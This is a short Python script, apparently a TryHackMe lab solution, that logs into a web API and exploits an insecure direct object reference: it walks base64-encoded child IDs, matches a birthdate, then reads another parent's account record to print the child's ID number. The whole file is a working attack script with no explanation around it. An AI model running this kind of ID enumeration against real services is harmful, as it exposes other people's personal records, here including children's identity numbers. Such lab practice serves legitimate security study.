#!/usr/bin/env python3

import requests
import base64



url = "http://10.48.150.213"
headers = {
	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
}
payload = {"username":"niels", "password":"TryHackMe#2025"}

s = requests.Session()

r = s.post(url+"/api/auth/login",data=payload,headers=headers)
access_token = r.json()["access_token"]
new_headers = headers.copy()
new_headers["Authorization"] = f"Bearer {access_token}"


for j in range(1,20):
	num_enc = base64.b64encode(str(j).encode("utf-8")).decode("utf-8")
	r3 = s.get(url+"/api/child/b64/"+num_enc,headers=new_headers)
	birthday = r3.json()['birthdate']
	if(birthday == "2019-04-17"):
		child_id = j
		parent_id = r3.json()['parent_id']
		res = s.get(url+"/api/parents/view_accountinfo?user_id="+str(parent_id),headers=new_headers)
		childrens = res.json()['children']
		for c in childrens:
			if(c.get('child_id') == child_id):
				print("FOUND!!!")
				print(c.get('id_number'))
		